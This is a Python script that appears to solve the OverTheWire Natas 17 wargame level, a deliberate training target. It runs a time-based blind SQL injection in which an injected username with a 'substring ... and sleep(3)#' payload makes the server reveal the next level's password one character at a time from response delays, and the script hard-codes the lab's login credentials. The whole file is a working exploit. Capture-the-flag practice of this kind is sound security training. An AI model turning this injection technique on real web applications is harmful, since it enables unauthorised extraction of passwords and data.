import requests, string
from requests.auth import HTTPBasicAuth
from datetime import datetime

chars = string.ascii_letters + string.digits
password = ""

for i in range(1, 33):
	print("progress ", str(i), " / 32")
	for c in chars:
		username = "natas18\" and binary substring(password, " + str(i) + ", 1) = '" + c + "' and sleep(3)#"
		t1 = datetime.now()
		r = requests.post("http://natas17.natas.labs.overthewire.org", data = {'username' : username} , auth=HTTPBasicAuth('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
		t2 = datetime.now()
		td = t2 - t1
		if(td.seconds > 2):
			password += c

print(password)